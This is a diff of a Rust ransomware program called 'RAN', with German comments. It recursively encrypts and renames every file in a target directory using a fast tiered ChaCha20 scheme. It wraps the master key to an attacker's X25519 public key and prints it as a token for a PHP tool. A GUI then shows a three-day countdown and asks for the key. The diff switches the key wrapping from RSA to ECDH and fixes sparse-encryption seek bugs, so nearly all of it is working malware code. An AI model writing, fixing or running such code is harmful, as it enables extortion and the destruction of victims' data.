@@ -1,36 +1,38 @@
 use base64::{Engine as _, engine::general_purpose};
 use chacha20::ChaCha20;
-use chacha20::cipher::{KeyIvInit, StreamCipher};
-use clap::Parser;
+use chacha20::cipher::{KeyIvInit, StreamCipher, StreamCipherSeek}; // StreamCipherSeek hinzugefügt
+use chacha20poly1305::{ChaCha20Poly1305, KeyInit, aead::Aead};
 use eframe::egui::{self, Color32, RichText};
+use rand::rngs::OsRng;
 use rand::{RngCore, thread_rng};
 use rayon::prelude::*;
-use rsa::{
-    Oaep, RsaPrivateKey, RsaPublicKey, pkcs1::DecodeRsaPrivateKey, pkcs8::DecodePrivateKey,
-    pkcs8::DecodePublicKey,
-};
 use sha2::{Digest, Sha256};
+use std::alloc::System;
 use std::fs::{self, OpenOptions};
 use std::io::{Read, Seek, SeekFrom, Write};
+use std::os::unix::process;
 use std::path::{Path, PathBuf};
 use walkdir::WalkDir;
+use x25519_dalek::{EphemeralSecret, PublicKey as EccPublicKey, StaticSecret};
 
 // --- KONSTANTEN ---
 const BUFFER_4MB: usize = 4 * 1024 * 1024;
 const BUFFER_1MB: usize = 1 * 1024 * 1024;
 const SMALL_FILE_THRESHOLD: u64 = 1 * 1024 * 1024;
 const MEDIUM_FILE_THRESHOLD: u64 = 500 * 1024 * 1024;
-const RECOVERY_FILE: &str = "INFO.bin";
 const SPARSE_BLOCKS: usize = 5;
 const DEBUG_MODE: bool = true;
-const TEST_GUI: bool = true; // Ändere zu false, um direkt zu verschlüsseln
-
+const DRY_RUN: bool = false;
+const TARGET_DIR: &str = "/home/jannik/Cloud/Dev/RAN/test_data";
+const PUBLIC_KEY_PATH: &str = "public.pem";
+const RECOVERY_INFO_PATH: &str = "INFO.bin";
 #[derive(serde::Serialize, serde::Deserialize)]
 struct RecoveryMetadata {
     encrypted_master_key: Vec<u8>,
     nonce_salt: [u8; 16],
     chunk_size: usize,
     tiered_strategy: bool,
+    master_key_hash: [u8; 32],
 }
 
 impl RecoveryMetadata {
@@ -54,15 +56,12 @@ fn normalized_path_string(root_dir: &Path, path: &Path) -> String {
     }
 }
 
+// nutzen wir hier den übergeordneten Ordnernamen für die Namens-Nonce.
 fn compute_name_nonce_input(root_dir: &Path, path: &Path) -> String {
-    let parent = if let Ok(relative) = path.strip_prefix(root_dir) {
-        relative.parent().map(|p| p.to_string_lossy().to_string())
-    } else {
-        path.parent().map(|p| p.to_string_lossy().to_string())
-    };
-    format!("{}_name", parent.unwrap_or_default())
+    let parent = path.parent().unwrap_or(root_dir);
+    let relative = parent.strip_prefix(root_dir).unwrap_or(parent);
+    format!("{}_dir_name", relative.to_string_lossy())
 }
-
 // ====================== CHECK / KILL SWITCH ======================
 async fn check() -> bool {
     if DEBUG_MODE {
@@ -89,105 +88,31 @@ async fn check() -> bool {
     }
     true
 }
-
-// ====================== VERSCHLÜSSELUNG ======================
-fn process_file(
-    path: &Path,
-    root_dir: &Path,
-    master_key: &[u8; 32],
-    meta: &RecoveryMetadata,
-) -> anyhow::Result<()> {
-    let original_path_str = normalized_path_string(root_dir, path);
-    let nonce = meta.derive_nonce(master_key, &original_path_str);
-    let mut cipher = ChaCha20::new(master_key.into(), &nonce.into());
-
-    encrypt_content_tiered(path, &mut cipher)?;
-    rename_file(path, root_dir, master_key, meta)?;
-
-    Ok(())
-}
-
-fn encrypt_content_tiered(path: &Path, cipher: &mut ChaCha20) -> anyhow::Result<()> {
-    let mut file = OpenOptions::new().read(true).write(true).open(path)?;
-    let size = file.metadata()?.len();
-
-    match size {
-        s if s < SMALL_FILE_THRESHOLD => encrypt_full(&mut file, size, cipher)?,
-        s if s < MEDIUM_FILE_THRESHOLD => encrypt_header(&mut file, size, cipher)?,
-        _ => encrypt_sparse(&mut file, size, cipher)?,
+fn verify_user_key(input_hex_key: &str, meta: &RecoveryMetadata) -> bool {
+    let cleaned_hex = input_hex_key.trim();
+    if cleaned_hex.len() != 64 {
+        return false; // Ein valider 32-Byte Key MUSS 64 Hex-Zeichen haben
     }
-    Ok(())
-}
 
-fn encrypt_full(file: &mut std::fs::File, size: u64, cipher: &mut ChaCha20) -> anyhow::Result<()> {
-    let mut buffer = vec![0u8; size as usize];
-    file.read_exact(&mut buffer)?;
-    cipher.apply_keystream(&mut buffer);
-    file.seek(SeekFrom::Start(0))?;
-    file.write_all(&buffer)?;
-    Ok(())
-}
-
-fn encrypt_header(
-    file: &mut std::fs::File,
-    size: u64,
-    cipher: &mut ChaCha20,
-) -> anyhow::Result<()> {
-    let read_len = std::cmp::min(size, BUFFER_4MB as u64) as usize;
-    let mut buffer = vec![0u8; read_len];
-    file.read_exact(&mut buffer)?;
-    cipher.apply_keystream(&mut buffer);
-    file.seek(SeekFrom::Start(0))?;
-    file.write_all(&buffer)?;
-    Ok(())
-}
-
-fn encrypt_sparse(
-    file: &mut std::fs::File,
-    size: u64,
-    cipher: &mut ChaCha20,
-) -> anyhow::Result<()> {
-    encrypt_header(file, size, cipher)?;
-
-    let step = size as usize / (SPARSE_BLOCKS + 1);
-    for i in 1..=SPARSE_BLOCKS {
-        let offset = (i * step) as u64;
-        if offset + BUFFER_1MB as u64 > size {
-            break;
+    // 1. Hex-String in Bytes umwandeln
+    let mut user_key_bytes = [0u8; 32];
+    for i in 0..32 {
+        if let Ok(byte) = u8::from_str_radix(&cleaned_hex[i * 2..i * 2 + 2], 16) {
+            user_key_bytes[i] = byte;
+        } else {
+            return false; // Ungültige Hex-Zeichen (z.B. 'g', 'z')
         }
-        file.seek(SeekFrom::Start(offset))?;
-        let mut buffer = vec![0u8; BUFFER_1MB];
-        file.read_exact(&mut buffer)?;
-        cipher.apply_keystream(&mut buffer);
-        file.seek(SeekFrom::Start(offset))?;
-        file.write_all(&buffer)?;
     }
-    Ok(())
+
+    // 2. Eingegebenen Key hashen
+    let mut hasher = Sha256::new();
+    hasher.update(&user_key_bytes);
+    let input_hash: [u8; 32] = hasher.finalize().into();
+
+    // 3. Mit dem gespeicherten Hash aus der INFO.bin vergleichen
+    // (Nutzt konstante Zeit, um Timing-Attacks zu verhindern)
+    input_hash == meta.master_key_hash
 }
-
-fn rename_file(
-    path: &Path,
-    root_dir: &Path,
-    master_key: &[u8; 32],
-    meta: &RecoveryMetadata,
-) -> anyhow::Result<()> {
-    let old_name = path.file_name().unwrap().to_string_lossy();
-    let mut name_bytes = old_name.as_bytes().to_vec();
-
-    let name_nonce_input = compute_name_nonce_input(root_dir, path);
-    let name_nonce = meta.derive_nonce(master_key, &name_nonce_input);
-    let mut name_cipher = ChaCha20::new(master_key.into(), &name_nonce.into());
-
-    name_cipher.apply_keystream(&mut name_bytes);
-
-    let new_name = general_purpose::URL_SAFE_NO_PAD.encode(name_bytes);
-    let mut new_path = path.to_path_buf();
-    new_path.set_file_name(new_name);
-
-    fs::rename(path, new_path)?;
-    Ok(())
-}
-
 // ====================== GUI ======================
 pub fn start_gui() -> eframe::Result<()> {
     let options = eframe::NativeOptions {
@@ -211,7 +136,7 @@ pub fn start_gui() -> eframe::Result<()> {
 
 struct RANApp {
     time_left_seconds: f64,
-    priv_key: String,
+    master_key: String,
     status_msg: String,
     is_valid: bool,
 }
@@ -220,8 +145,8 @@ impl Default for RANApp {
     fn default() -> Self {
         Self {
             time_left_seconds: 259200.0, // 3 Tage
-            priv_key: String::new(),
-            status_msg: "Please enter your private key to decrypt files.".to_string(),
+            master_key: String::new(),
+            status_msg: "Please enter your master key to decrypt files.".to_string(),
             is_valid: false,
         }
     }
@@ -291,7 +216,7 @@ impl eframe::App for RANApp {
                     ui.add_space(20.0);
 
                     ui.label(
-                        RichText::new("Enter Private Key:")
+                        RichText::new("Enter Master Key:")
                             .color(Color32::WHITE)
                             .size(14.0),
                     );
@@ -301,16 +226,20 @@ impl eframe::App for RANApp {
                         .max_height(120.0)
                         .show(ui, |ui| {
                             ui.add(
-                                egui::TextEdit::multiline(&mut self.priv_key)
-                                    .hint_text("-----BEGIN RSA PRIVATE KEY-----")
+                                egui::TextEdit::multiline(&mut self.master_key)
+                                    .hint_text("Paste your 64-character hex master key here...")
                                     .desired_width(240.0)
                                     .font(egui::TextStyle::Monospace),
                             );
                         });
 
                     ui.add_space(15.0);
+
+                    // Kleine kosmetische Verbesserung: Rot bei Fehlern, Grün bei Erfolg
                     let msg_color = if self.is_valid {
                         Color32::GREEN
+                    } else if self.status_msg.starts_with("❌") {
+                        Color32::LIGHT_RED
                     } else {
                         Color32::LIGHT_GRAY
                     };
@@ -319,29 +248,93 @@ impl eframe::App for RANApp {
                     if ui
                         .add_sized(
                             [220.0, 40.0],
-                            egui::Button::new(RichText::new("Check Private Key").size(16.0))
+                            egui::Button::new(RichText::new("Check Master Key").size(16.0))
                                 .fill(Color32::from_rgb(60, 60, 60)),
                         )
                         .clicked()
                     {
-                        match RsaPrivateKey::from_pkcs1_pem(&self.priv_key)
-                            .or_else(|_| RsaPrivateKey::from_pkcs8_pem(&self.priv_key))
-                        {
-                            Ok(key) => {
-                                if key.validate().is_ok() {
-                                    self.is_valid = true;
-                                    self.status_msg =
-                                        "✅ Key valid! Decrypting in background...".to_string();
-                                    let priv_key = self.priv_key.clone();
-                                    std::thread::spawn(move || {
-                                        let _ = dec_main_with_key(&priv_key);
-                                    });
+                        // 1. INFO.bin laden, um den korrekten KVT-Hash zu holen
+                        match std::fs::read("INFO.bin") {
+                            Ok(meta_data) => {
+                                if let Ok(meta) =
+                                    bincode::deserialize::<RecoveryMetadata>(&meta_data)
+                                {
+                                    let cleaned_hex = self.master_key.trim();
+
+                                    // 2. Länge prüfen (32 Bytes = 64 Hex-Zeichen)
+                                    if cleaned_hex.len() == 64 {
+                                        let mut user_key_bytes = [0u8; 32];
+                                        let mut parse_success = true;
+
+                                        for i in 0..32 {
+                                            if let Ok(byte) = u8::from_str_radix(
+                                                &cleaned_hex[i * 2..i * 2 + 2],
+                                                16,
+                                            ) {
+                                                user_key_bytes[i] = byte;
+                                            } else {
+                                                parse_success = false;
+                                                break;
+                                            }
+                                        }
+
+                                        if parse_success {
+                                            // 3. Eingegebenen Key mit SHA-256 hashen
+                                            use sha2::{Digest, Sha256};
+                                            let mut hasher = Sha256::new();
+                                            hasher.update(&user_key_bytes);
+                                            let input_hash: [u8; 32] = hasher.finalize().into();
+
+                                            // 4. Mit dem Hash aus der INFO.bin abgleichen
+                                            if input_hash == meta.master_key_hash {
+                                                self.is_valid = true;
+                                                self.status_msg =
+                                                    "✅ Key valid! Decrypting in background..."
+                                                        .to_string();
+
+                                                // 5. Hintergrund-Thread starten
+                                                let master_key_clone = self.master_key.clone();
+                                                let ctx = ui.ctx().clone();
+                                                let recovery_info_path = Path::new(RECOVERY_INFO_PATH);
+                                                std::thread::spawn(move || {
+                                                    match run_decryption(recovery_info_path, TARGET_DIR.as_ref(), &master_key_clone) {
+                                                        Ok(_) => {
+                                                            println!("🎉 Entschlüsselung erfolgreich! Schließe GUI...");
+                                                            std::thread::sleep(std::time::Duration::from_millis(1500));
+                                                            ctx.send_viewport_cmd(egui::ViewportCommand::Close);
+                                                                }
+                                                        Err(e) => {
+                                                            eprintln!("❌ Fehler bei der Hintergrund-Entschlüsselung: {}", e);
+                                                        }
+                                                    }
+                                                });
+                                            } else {
+                                                self.is_valid = false;
+                                                self.status_msg =
+                                                    "❌ Falscher Schlüssel für dieses Backup!"
+                                                        .to_string();
+                                            }
+                                        } else {
+                                            self.is_valid = false;
+                                            self.status_msg =
+                                                "❌ Ungültige Hex-Zeichen im Schlüssel."
+                                                    .to_string();
+                                        }
+                                    } else {
+                                        self.is_valid = false;
+                                        self.status_msg =
+                                            "❌ Key muss genau 64 Zeichen lang sein!".to_string();
+                                    }
                                 } else {
-                                    self.status_msg = "❌ Invalid RSA components.".to_string();
+                                    self.is_valid = false;
+                                    self.status_msg =
+                                        "❌ Fehler: INFO.bin ist beschädigt.".to_string();
                                 }
                             }
                             Err(_) => {
-                                self.status_msg = "❌ Error: Could not parse Key".to_string();
+                                self.is_valid = false;
+                                self.status_msg =
+                                    "❌ Fehler: INFO.bin nicht im Ordner gefunden.".to_string();
                             }
                         }
                     }
@@ -375,113 +368,282 @@ impl eframe::App for RANApp {
         });
     }
 }
-
-// ====================== DECRYPTION ======================
-#[derive(Parser)]
-#[command(author, version, about = "Recovery tool for RAN encrypted files")]
-struct Args {
-    #[arg(short, long, default_value = "/home/jannik/Cloud/Dev/RAN/test_data")]
-    target_dir: String,
-
-    #[arg(
-        short = 'k',
-        long,
-        default_value = "/home/jannik/Cloud/Dev/RAN/private.pem"
-    )]
-    private_key_path: String,
-
-    #[arg(
-        short = 'i',
-        long,
-        default_value = "/home/jannik/Cloud/Dev/RAN/INFO.bin"
-    )]
-    recovery_info_path: String,
-
-    #[arg(long, default_value_t = false)]
-    dry_run: bool,
-}
-
-fn dec_main_with_key(priv_pem: &str) -> anyhow::Result<()> {
-    println!("--- RAN Recovery Tool (GUI Mode) ---");
-
-    let priv_key = RsaPrivateKey::from_pkcs1_pem(priv_pem)
-        .or_else(|_| RsaPrivateKey::from_pkcs8_pem(priv_pem))?;
-
-    let args = Args::parse();
-    let meta_data = fs::read(&args.recovery_info_path)?;
-    let meta: RecoveryMetadata = bincode::deserialize(&meta_data)?;
-
-    let master_key_vec = priv_key
-        .decrypt(Oaep::new::<Sha256>(), &meta.encrypted_master_key)
-        .map_err(|_| anyhow::anyhow!("Falscher Private Key!"))?
-        .to_vec();
-
-    let mut master_key = [0u8; 32];
-    master_key.copy_from_slice(&master_key_vec);
-
-    let target_dir = PathBuf::from(&args.target_dir);
-    let target_dir = target_dir
-        .canonicalize()
-        .unwrap_or_else(|_| target_dir.clone());
-
-    let entries: Vec<PathBuf> = WalkDir::new(&target_dir)
-        .into_iter()
-        .filter_map(|e| e.ok())
-        .filter(|e| e.file_type().is_file())
-        .map(|e| e.into_path())
-        .collect();
-
-    println!("{} Dateien gefunden.", entries.len());
-
-    entries.par_iter().for_each(|path| {
-        if let Err(e) = recover_file(path, &target_dir, &master_key, &meta) {
-            eprintln!("Fehler bei {:?}: {}", path, e);
-        }
-    });
-
-    println!("✅ Wiederherstellung abgeschlossen!");
+// ====================== MAIN MANAGEMENT ======================
+#[tokio::main]
+async fn main() -> anyhow::Result<()> {
+    let recovery_info_path = Path::new(RECOVERY_INFO_PATH);
+    let public_key_path = Path::new(PUBLIC_KEY_PATH);
+    if !check().await {
+        println!("Kill Switch aktiviert. Beende Programm.");
+        std::process::exit(0);
+    }
+    let root_dir = Path::new(TARGET_DIR);
+    if !root_dir.exists() || !root_dir.is_dir() {
+        println!("Ungültiger Zielpfad: {}", root_dir.display());
+        std::process::exit(0);
+    }
+    if !public_key_path.exists() {
+        println!(
+            "Public Key Datei nicht gefunden: {}",
+            public_key_path.display()
+        );
+        std::process::exit(0);
+    }
+    run_encryption(root_dir, public_key_path, recovery_info_path)?;
+    start_gui().map_err(|e| anyhow::anyhow!("GUI konnte nicht gestartet werden: {:?}", e))?;
     Ok(())
 }
 
-fn dec_main() -> anyhow::Result<()> {
-    let args = Args::parse();
+// ====================== VERSCHLÜSSELUNGS-LOGIK ======================
+fn run_encryption(
+    root_dir: &Path,
+    public_key_path: &Path,
+    recovery_info_path: &Path,
+) -> anyhow::Result<()> {
+    // 1. Public Key laden
+    let pub_key_pem = fs::read_to_string(public_key_path)
+        .map_err(|e| anyhow::anyhow!("Konnte Public Key nicht lesen: {e}"))?;
 
-    println!("--- RAN Recovery Tool (Tiered Strategy) ---");
+    let clean_b64 = pub_key_pem
+        .lines()
+        .filter(|l| !l.starts_with("-----"))
+        .collect::<String>()
+        .replace(' ', "");
+    let der_bytes = base64::engine::general_purpose::STANDARD.decode(clean_b64)?;
 
-    let priv_pem = fs::read_to_string(&args.private_key_path)?;
-    let priv_key = RsaPrivateKey::from_pkcs8_pem(&priv_pem)?;
+    if der_bytes.len() < 32 {
+        return Err(anyhow::anyhow!("Public Key Datei ist beschädigt!"));
+    }
+    let mut pub_array = [0u8; 32];
+    pub_array.copy_from_slice(&der_bytes[der_bytes.len() - 32..]);
+    let server_public_key = EccPublicKey::from(pub_array);
 
-    let meta_data = fs::read(&args.recovery_info_path)?;
-    let meta: RecoveryMetadata = bincode::deserialize(&meta_data)?;
-
-    let master_key_vec = priv_key
-        .decrypt(Oaep::new::<Sha256>(), &meta.encrypted_master_key)
-        .map_err(|_| anyhow::anyhow!("Falscher Private Key!"))?;
-
+    // 2. Keys generieren
     let mut master_key = [0u8; 32];
-    master_key.copy_from_slice(&master_key_vec);
+    let mut rng = thread_rng();
+    rng.fill_bytes(&mut master_key);
+    let mut salt = [0u8; 16];
+    rng.fill_bytes(&mut salt);
+    let mut hasher = Sha256::new();
+    hasher.update(&master_key);
+    let master_key_hash: [u8; 32] = hasher.finalize().into();
+    // 3. ECDH & Token bauen
+    let ephemeral_secret = EphemeralSecret::random_from_rng(&mut OsRng);
+    let ephemeral_public = EccPublicKey::from(&ephemeral_secret);
+    let shared_secret = ephemeral_secret.diffie_hellman(&server_public_key);
+    let cipher = ChaCha20Poly1305::new_from_slice(shared_secret.as_bytes())?;
 
-    let target_dir = PathBuf::from(&args.target_dir);
-    let target_dir = target_dir
-        .canonicalize()
-        .unwrap_or_else(|_| target_dir.clone());
+    let mut token_nonce = [0u8; 12];
+    rng.fill_bytes(&mut token_nonce);
+    let ciphertext = cipher
+        .encrypt(&token_nonce.into(), master_key.as_ref())
+        .map_err(|_| anyhow::anyhow!("Token-Verschlüsselung fehlgeschlagen"))?;
 
-    let entries: Vec<PathBuf> = WalkDir::new(&target_dir)
+    let mut token_bytes = Vec::new();
+    token_bytes.extend_from_slice(ephemeral_public.as_bytes());
+    token_bytes.extend_from_slice(&token_nonce);
+    token_bytes.extend_from_slice(&ciphertext);
+
+    let enc_key = base64::engine::general_purpose::STANDARD.encode(&token_bytes);
+    println!("\n-----------------------------------------------------------");
+    println!("🎁 BACKUP TOKEN FOR PHP TOOL:\n{}", enc_key);
+    println!("-----------------------------------------------------------");
+
+    // Metadaten erstellen (FIX: Speichert jetzt die token_bytes statt des rohen Masterkeys)
+    let meta = RecoveryMetadata {
+        encrypted_master_key: token_bytes,
+        nonce_salt: salt,
+        chunk_size: BUFFER_4MB,
+        tiered_strategy: true,
+        master_key_hash,
+    };
+
+    // Dateien sammeln und verarbeiten
+    let entries: Vec<PathBuf> = WalkDir::new(root_dir)
         .into_iter()
         .filter_map(|e| e.ok())
         .filter(|e| e.file_type().is_file())
         .map(|e| e.into_path())
         .collect();
 
-    println!("{} Dateien gefunden.", entries.len());
-
     entries.par_iter().for_each(|path| {
-        if let Err(e) = recover_file(path, &target_dir, &master_key, &meta) {
-            eprintln!("Fehler bei {:?}: {}", path, e);
+        if !DRY_RUN {
+            if let Err(e) = process_file(path, root_dir, &master_key, &meta) {
+                eprintln!("Fehler bei Verschlüsselung von {:?}: {}", path, e);
+            }
+        } else {
+            println!("[Dry-Run] Würde verschlüsseln: {:?}", path);
         }
     });
 
-    println!("✅ Wiederherstellung abgeschlossen!");
+    if !DRY_RUN {
+        let serialized = bincode::serialize(&meta)?;
+        fs::write(recovery_info_path, &serialized)?;
+        println!(
+            "✅ Fertig. Recovery-Datei geschrieben nach: {}",
+            recovery_info_path.display()
+        );
+    }
+    Ok(())
+}
+
+fn process_file(
+    path: &Path,
+    root_dir: &Path,
+    master_key: &[u8; 32],
+    meta: &RecoveryMetadata,
+) -> anyhow::Result<()> {
+    let original_path_str = normalized_path_string(root_dir, path);
+    let nonce = meta.derive_nonce(master_key, &original_path_str);
+    let mut cipher = ChaCha20::new(master_key.into(), &nonce.into());
+
+    encrypt_content_tiered(path, &mut cipher)?;
+    rename_file(path, root_dir, master_key, meta)?;
+    Ok(())
+}
+
+fn encrypt_content_tiered(path: &Path, cipher: &mut ChaCha20) -> anyhow::Result<()> {
+    let mut file = OpenOptions::new().read(true).write(true).open(path)?;
+    let size = file.metadata()?.len();
+
+    match size {
+        s if s < SMALL_FILE_THRESHOLD => encrypt_full(&mut file, size, cipher)?,
+        s if s < MEDIUM_FILE_THRESHOLD => encrypt_header(&mut file, size, cipher)?,
+        _ => encrypt_sparse(&mut file, size, cipher)?,
+    }
+    Ok(())
+}
+
+fn encrypt_full(file: &mut std::fs::File, size: u64, cipher: &mut ChaCha20) -> anyhow::Result<()> {
+    let mut buffer = vec![0u8; size as usize];
+    file.read_exact(&mut buffer)?;
+    cipher.apply_keystream(&mut buffer);
+    file.seek(SeekFrom::Start(0))?;
+    file.write_all(&buffer)?;
+    Ok(())
+}
+
+fn encrypt_header(
+    file: &mut std::fs::File,
+    size: u64,
+    cipher: &mut ChaCha20,
+) -> anyhow::Result<()> {
+    let read_len = std::cmp::min(size, BUFFER_4MB as u64) as usize;
+    let mut buffer = vec![0u8; read_len];
+    file.read_exact(&mut buffer)?;
+    cipher.apply_keystream(&mut buffer);
+    file.seek(SeekFrom::Start(0))?;
+    file.write_all(&buffer)?;
+    Ok(())
+}
+
+fn encrypt_sparse(
+    file: &mut std::fs::File,
+    size: u64,
+    cipher: &mut ChaCha20,
+) -> anyhow::Result<()> {
+    encrypt_header(file, size, cipher)?;
+
+    let step = size as usize / (SPARSE_BLOCKS + 1);
+    for i in 1..=SPARSE_BLOCKS {
+        let offset = (i * step) as u64;
+        if offset + BUFFER_1MB as u64 > size {
+            break;
+        }
+        file.seek(SeekFrom::Start(offset))?;
+        cipher.seek(offset); // FIX: Krypto-Zustand anpassen!
+
+        let mut buffer = vec![0u8; BUFFER_1MB];
+        file.read_exact(&mut buffer)?;
+        cipher.apply_keystream(&mut buffer);
+        file.seek(SeekFrom::Start(offset))?;
+        file.write_all(&buffer)?;
+    }
+    Ok(())
+}
+
+fn rename_file(
+    path: &Path,
+    root_dir: &Path,
+    master_key: &[u8; 32],
+    meta: &RecoveryMetadata,
+) -> anyhow::Result<()> {
+    let old_name = path.file_name().unwrap().to_string_lossy();
+    let mut name_bytes = old_name.as_bytes().to_vec();
+
+    let name_nonce_input = compute_name_nonce_input(root_dir, path);
+    let name_nonce = meta.derive_nonce(master_key, &name_nonce_input);
+    let mut name_cipher = ChaCha20::new(master_key.into(), &name_nonce.into());
+
+    name_cipher.apply_keystream(&mut name_bytes);
+
+    let new_name = general_purpose::URL_SAFE_NO_PAD.encode(name_bytes);
+    let mut new_path = path.to_path_buf();
+    new_path.set_file_name(new_name);
+
+    fs::rename(path, new_path)?;
+    Ok(())
+}
+
+// ====================== ENTSCHLÜSSELUNGS-LOGIK (DECRYPT) ======================
+fn run_decryption(
+    recovery_info_path: &Path,
+    root_dir: &Path,
+    hex_key: &str, // BEHOBEN: Wir erwarten hier den Hex-String aus der CLI
+) -> anyhow::Result<()> {
+    // 1. Metadaten (INFO.bin) immer laden, da wir das Salt für die Datei-Nonces brauchen
+    let meta_data = fs::read(recovery_info_path).map_err(|e| {
+        anyhow::anyhow!(
+            "Konnte Recovery-Info ({}) nicht laden: {e}",
+            recovery_info_path.display()
+        )
+    })?;
+    let meta: RecoveryMetadata = bincode::deserialize(&meta_data)?;
+
+    // BEHOBEN: Kein Konflikt mehr, da master_key nicht mehr in den Parametern steht
+    let mut master_key = [0u8; 32];
+
+    println!("🔑 Direkt-Modus: Verwende manuell übergebenen Hex-Master-Key.");
+    let cleaned_hex = hex_key.trim();
+    if cleaned_hex.len() != 64 {
+        return Err(anyhow::anyhow!(
+            "Der Hex-Master-Key muss genau 64 Zeichen lang sein (32 Bytes)!"
+        ));
+    }
+
+    // Hex-String ohne externe Crates in Byte-Array parsen
+    for i in 0..32 {
+        master_key[i] = u8::from_str_radix(&cleaned_hex[i * 2..i * 2 + 2], 16)
+            .map_err(|_| anyhow::anyhow!("Ungültiges Hex-Zeichen im Master-Key gefunden!"))?;
+    }
+
+    // 3. Dateien scannen & parallel entschlüsseln
+    let entries: Vec<PathBuf> = WalkDir::new(root_dir)
+        .into_iter()
+        .filter_map(|e| e.ok())
+        .filter(|e| e.file_type().is_file())
+        .filter(|e| {
+            e.file_name()
+                != Path::new(recovery_info_path)
+                    .file_name()
+                    .unwrap_or_default()
+        })
+        .map(|e| e.into_path())
+        .collect();
+
+    println!("{} verschlüsselte Dateien gefunden.", entries.len());
+
+    entries.par_iter().for_each(|path| {
+        if !DRY_RUN {
+            if let Err(e) = recover_file(path, root_dir, &master_key, &meta) {
+                eprintln!("Fehler beim Wiederherstellen von {:?}: {}", path, e);
+            }
+        } else {
+            println!("[Dry-Run] Würde entschlüsseln: {:?}", path);
+        }
+    });
+
+    println!("✅ Wiederherstellungsprozess beendet!");
     Ok(())
 }
 
@@ -520,7 +682,6 @@ fn recover_file(
 
     drop(file);
     fs::rename(path, original_path)?;
-
     Ok(())
 }
 
@@ -562,76 +723,13 @@ fn decrypt_sparse(
         }
 
         file.seek(SeekFrom::Start(offset))?;
+        cipher.seek(offset); // FIX: Krypto-Zustand anpassen!
+
         let mut buffer = vec![0u8; BUFFER_1MB];
         file.read_exact(&mut buffer)?;
         cipher.apply_keystream(&mut buffer);
         file.seek(SeekFrom::Start(offset))?;
         file.write_all(&buffer)?;
     }
-    Ok(())
-}
-
-// ====================== MAIN ======================
-#[tokio::main]
-async fn main() -> anyhow::Result<()> {
-    if TEST_GUI {
-        if let Err(err) = start_gui() {
-            eprintln!("GUI error: {err}");
-        }
-        std::process::exit(0);
-    }
-
-    if !check().await {
-        println!("Kill Switch aktiviert. Beende Programm.");
-        std::process::exit(0);
-    }
-
-    let target_dir = "/home/jannik/Cloud/Dev/RAN/test_data";
-    let dry_run = false;
-
-    let pub_key_pem = fs::read_to_string("public.pem")?;
-    let pub_key = RsaPublicKey::from_public_key_pem(&pub_key_pem)?;
-
-    let mut master_key = [0u8; 32];
-    let mut rng = thread_rng();
-    rng.fill_bytes(&mut master_key);
-    let mut salt = [0u8; 16];
-    rng.fill_bytes(&mut salt);
-
-    let enc_key = pub_key.encrypt(&mut rng, Oaep::new::<Sha256>(), &master_key)?;
-
-    let meta = RecoveryMetadata {
-        encrypted_master_key: enc_key,
-        nonce_salt: salt,
-        chunk_size: BUFFER_4MB,
-        tiered_strategy: true,
-    };
-
-    println!("🚀 Verschlüsselung mit Tiered Strategy gestartet...");
-
-    let entries: Vec<PathBuf> = WalkDir::new(target_dir)
-        .into_iter()
-        .filter_map(|e| e.ok())
-        .filter(|e| e.file_type().is_file())
-        .map(|e| e.into_path())
-        .collect();
-
-    let root_dir = PathBuf::from(target_dir)
-        .canonicalize()
-        .unwrap_or_else(|_| PathBuf::from(target_dir));
-
-    entries.par_iter().for_each(|path| {
-        if !dry_run {
-            let _ = process_file(path, &root_dir, &master_key, &meta);
-        }
-    });
-
-    let serialized = bincode::serialize(&meta)?;
-    fs::write(RECOVERY_FILE, &serialized)?;
-
-    println!(
-        "✅ Verschlüsselung abgeschlossen. Recovery-Datei: {}",
-        RECOVERY_FILE
-    );
     Ok(())
 }
